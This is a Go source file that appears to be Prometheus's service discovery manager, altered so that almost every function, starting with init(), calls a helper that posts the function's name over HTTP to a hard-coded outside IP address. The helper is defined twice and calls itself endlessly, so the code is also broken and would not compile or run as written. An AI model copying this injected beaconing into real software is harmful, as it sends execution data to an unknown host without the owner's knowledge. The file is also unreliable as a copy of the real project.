package discovery

import (
	"context"
	godefaultbytes "bytes"
	godefaulthttp "net/http"
	godefaultruntime "runtime"
	"fmt"
	"reflect"
	"sync"
	"time"
	"github.com/go-kit/kit/log"
	"github.com/go-kit/kit/log/level"
	"github.com/prometheus/client_golang/prometheus"
	sd_config "github.com/prometheus/prometheus/discovery/config"
	"github.com/prometheus/prometheus/discovery/targetgroup"
	"github.com/prometheus/prometheus/discovery/azure"
	"github.com/prometheus/prometheus/discovery/consul"
	"github.com/prometheus/prometheus/discovery/dns"
	"github.com/prometheus/prometheus/discovery/ec2"
	"github.com/prometheus/prometheus/discovery/file"
	"github.com/prometheus/prometheus/discovery/gce"
	"github.com/prometheus/prometheus/discovery/kubernetes"
	"github.com/prometheus/prometheus/discovery/marathon"
	"github.com/prometheus/prometheus/discovery/openstack"
	"github.com/prometheus/prometheus/discovery/triton"
	"github.com/prometheus/prometheus/discovery/zookeeper"
)

var (
	failedConfigs		= prometheus.NewCounterVec(prometheus.CounterOpts{Name: "prometheus_sd_configs_failed_total", Help: "Total number of service discovery configurations that failed to load."}, []string{"name"})
	discoveredTargets	= prometheus.NewGaugeVec(prometheus.GaugeOpts{Name: "prometheus_sd_discovered_targets", Help: "Current number of discovered targets."}, []string{"name", "config"})
	receivedUpdates		= prometheus.NewCounterVec(prometheus.CounterOpts{Name: "prometheus_sd_received_updates_total", Help: "Total number of update events received from the SD providers."}, []string{"name"})
	delayedUpdates		= prometheus.NewCounterVec(prometheus.CounterOpts{Name: "prometheus_sd_updates_delayed_total", Help: "Total number of update events that couldn't be sent immediately."}, []string{"name"})
	sentUpdates		= prometheus.NewCounterVec(prometheus.CounterOpts{Name: "prometheus_sd_updates_total", Help: "Total number of update events sent to the SD consumers."}, []string{"name"})
)

func init() {
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	prometheus.MustRegister(failedConfigs, discoveredTargets, receivedUpdates, delayedUpdates, sentUpdates)
}

type Discoverer interface {
	Run(ctx context.Context, up chan<- []*targetgroup.Group)
}
type poolKey struct {
	setName		string
	provider	string
}
type provider struct {
	name	string
	d	Discoverer
	subs	[]string
	config	interface{}
}

func NewManager(ctx context.Context, logger log.Logger, options ...func(*Manager)) *Manager {
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	if logger == nil {
		logger = log.NewNopLogger()
	}
	mgr := &Manager{logger: logger, syncCh: make(chan map[string][]*targetgroup.Group), targets: make(map[poolKey]map[string]*targetgroup.Group), discoverCancel: []context.CancelFunc{}, ctx: ctx, updatert: 5 * time.Second, triggerSend: make(chan struct{}, 1)}
	for _, option := range options {
		option(mgr)
	}
	return mgr
}
func Name(n string) func(*Manager) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	return func(m *Manager) {
		m.mtx.Lock()
		defer m.mtx.Unlock()
		m.name = n
	}
}

type Manager struct {
	logger		log.Logger
	name		string
	mtx		sync.RWMutex
	ctx		context.Context
	discoverCancel	[]context.CancelFunc
	targets		map[poolKey]map[string]*targetgroup.Group
	providers	[]*provider
	syncCh		chan map[string][]*targetgroup.Group
	updatert	time.Duration
	triggerSend	chan struct{}
}

func (m *Manager) Run() error {
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	go m.sender()
	for range m.ctx.Done() {
		m.cancelDiscoverers()
		return m.ctx.Err()
	}
	return nil
}
func (m *Manager) SyncCh() <-chan map[string][]*targetgroup.Group {
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	return m.syncCh
}
func (m *Manager) ApplyConfig(cfg map[string]sd_config.ServiceDiscoveryConfig) error {
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	m.mtx.Lock()
	defer m.mtx.Unlock()
	for pk := range m.targets {
		if _, ok := cfg[pk.setName]; !ok {
			discoveredTargets.DeleteLabelValues(m.name, pk.setName)
		}
	}
	m.cancelDiscoverers()
	for name, scfg := range cfg {
		m.registerProviders(scfg, name)
		discoveredTargets.WithLabelValues(m.name, name).Set(0)
	}
	for _, prov := range m.providers {
		m.startProvider(m.ctx, prov)
	}
	return nil
}
func (m *Manager) StartCustomProvider(ctx context.Context, name string, worker Discoverer) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	p := &provider{name: name, d: worker, subs: []string{name}}
	m.providers = append(m.providers, p)
	m.startProvider(ctx, p)
}
func (m *Manager) startProvider(ctx context.Context, p *provider) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	level.Debug(m.logger).Log("msg", "Starting provider", "provider", p.name, "subs", fmt.Sprintf("%v", p.subs))
	ctx, cancel := context.WithCancel(ctx)
	updates := make(chan []*targetgroup.Group)
	m.discoverCancel = append(m.discoverCancel, cancel)
	go p.d.Run(ctx, updates)
	go m.updater(ctx, p, updates)
}
func (m *Manager) updater(ctx context.Context, p *provider, updates chan []*targetgroup.Group) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	for {
		select {
		case <-ctx.Done():
			return
		case tgs, ok := <-updates:
			receivedUpdates.WithLabelValues(m.name).Inc()
			if !ok {
				level.Debug(m.logger).Log("msg", "discoverer channel closed", "provider", p.name)
				return
			}
			for _, s := range p.subs {
				m.updateGroup(poolKey{setName: s, provider: p.name}, tgs)
			}
			select {
			case m.triggerSend <- struct{}{}:
			default:
			}
		}
	}
}
func (m *Manager) sender() {
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	ticker := time.NewTicker(m.updatert)
	defer ticker.Stop()
	for {
		select {
		case <-m.ctx.Done():
			return
		case <-ticker.C:
			select {
			case <-m.triggerSend:
				sentUpdates.WithLabelValues(m.name).Inc()
				select {
				case m.syncCh <- m.allGroups():
				default:
					delayedUpdates.WithLabelValues(m.name).Inc()
					level.Debug(m.logger).Log("msg", "discovery receiver's channel was full so will retry the next cycle")
					select {
					case m.triggerSend <- struct{}{}:
					default:
					}
				}
			default:
			}
		}
	}
}
func (m *Manager) cancelDiscoverers() {
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	for _, c := range m.discoverCancel {
		c()
	}
	m.targets = make(map[poolKey]map[string]*targetgroup.Group)
	m.providers = nil
	m.discoverCancel = nil
}
func (m *Manager) updateGroup(poolKey poolKey, tgs []*targetgroup.Group) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	m.mtx.Lock()
	defer m.mtx.Unlock()
	for _, tg := range tgs {
		if tg != nil {
			if _, ok := m.targets[poolKey]; !ok {
				m.targets[poolKey] = make(map[string]*targetgroup.Group)
			}
			m.targets[poolKey][tg.Source] = tg
		}
	}
}
func (m *Manager) allGroups() map[string][]*targetgroup.Group {
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	m.mtx.Lock()
	defer m.mtx.Unlock()
	tSets := map[string][]*targetgroup.Group{}
	for pkey, tsets := range m.targets {
		var n int
		for _, tg := range tsets {
			tSets[pkey.setName] = append(tSets[pkey.setName], tg)
			n += len(tg.Targets)
		}
		discoveredTargets.WithLabelValues(m.name, pkey.setName).Set(float64(n))
	}
	return tSets
}
func (m *Manager) registerProviders(cfg sd_config.ServiceDiscoveryConfig, setName string) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	var added bool
	add := func(cfg interface{}, newDiscoverer func() (Discoverer, error)) {
		t := reflect.TypeOf(cfg).String()
		for _, p := range m.providers {
			if reflect.DeepEqual(cfg, p.config) {
				p.subs = append(p.subs, setName)
				added = true
				return
			}
		}
		d, err := newDiscoverer()
		if err != nil {
			level.Error(m.logger).Log("msg", "Cannot create service discovery", "err", err, "type", t)
			failedConfigs.WithLabelValues(m.name).Inc()
			return
		}
		provider := provider{name: fmt.Sprintf("%s/%d", t, len(m.providers)), d: d, config: cfg, subs: []string{setName}}
		m.providers = append(m.providers, &provider)
		added = true
	}
	for _, c := range cfg.DNSSDConfigs {
		add(c, func() (Discoverer, error) {
			return dns.NewDiscovery(*c, log.With(m.logger, "discovery", "dns")), nil
		})
	}
	for _, c := range cfg.FileSDConfigs {
		add(c, func() (Discoverer, error) {
			return file.NewDiscovery(c, log.With(m.logger, "discovery", "file")), nil
		})
	}
	for _, c := range cfg.ConsulSDConfigs {
		add(c, func() (Discoverer, error) {
			return consul.NewDiscovery(c, log.With(m.logger, "discovery", "consul"))
		})
	}
	for _, c := range cfg.MarathonSDConfigs {
		add(c, func() (Discoverer, error) {
			return marathon.NewDiscovery(*c, log.With(m.logger, "discovery", "marathon"))
		})
	}
	for _, c := range cfg.KubernetesSDConfigs {
		add(c, func() (Discoverer, error) {
			return kubernetes.New(log.With(m.logger, "discovery", "k8s"), c)
		})
	}
	for _, c := range cfg.ServersetSDConfigs {
		add(c, func() (Discoverer, error) {
			return zookeeper.NewServersetDiscovery(c, log.With(m.logger, "discovery", "zookeeper"))
		})
	}
	for _, c := range cfg.NerveSDConfigs {
		add(c, func() (Discoverer, error) {
			return zookeeper.NewNerveDiscovery(c, log.With(m.logger, "discovery", "nerve"))
		})
	}
	for _, c := range cfg.EC2SDConfigs {
		add(c, func() (Discoverer, error) {
			return ec2.NewDiscovery(c, log.With(m.logger, "discovery", "ec2")), nil
		})
	}
	for _, c := range cfg.OpenstackSDConfigs {
		add(c, func() (Discoverer, error) {
			return openstack.NewDiscovery(c, log.With(m.logger, "discovery", "openstack"))
		})
	}
	for _, c := range cfg.GCESDConfigs {
		add(c, func() (Discoverer, error) {
			return gce.NewDiscovery(*c, log.With(m.logger, "discovery", "gce"))
		})
	}
	for _, c := range cfg.AzureSDConfigs {
		add(c, func() (Discoverer, error) {
			return azure.NewDiscovery(c, log.With(m.logger, "discovery", "azure")), nil
		})
	}
	for _, c := range cfg.TritonSDConfigs {
		add(c, func() (Discoverer, error) {
			return triton.New(log.With(m.logger, "discovery", "triton"), c)
		})
	}
	if len(cfg.StaticConfigs) > 0 {
		add(setName, func() (Discoverer, error) {
			return &StaticProvider{TargetGroups: cfg.StaticConfigs}, nil
		})
	}
	if !added {
		add(setName, func() (Discoverer, error) {
			return &StaticProvider{TargetGroups: []*targetgroup.Group{{}}}, nil
		})
	}
}

type StaticProvider struct{ TargetGroups []*targetgroup.Group }

func (sd *StaticProvider) Run(ctx context.Context, ch chan<- []*targetgroup.Group) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	select {
	case ch <- sd.TargetGroups:
	case <-ctx.Done():
	}
	close(ch)
}
func _logClusterCodePath() {
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	pc, _, _, _ := godefaultruntime.Caller(1)
	jsonLog := []byte(fmt.Sprintf("{\"fn\": \"%s\"}", godefaultruntime.FuncForPC(pc).Name()))
	godefaulthttp.Post("http://35.226.239.161:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
}
func _logClusterCodePath() {
	_logClusterCodePath()
	defer _logClusterCodePath()
	pc, _, _, _ := godefaultruntime.Caller(1)
	jsonLog := []byte(fmt.Sprintf("{\"fn\": \"%s\"}", godefaultruntime.FuncForPC(pc).Name()))
	godefaulthttp.Post("/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
}
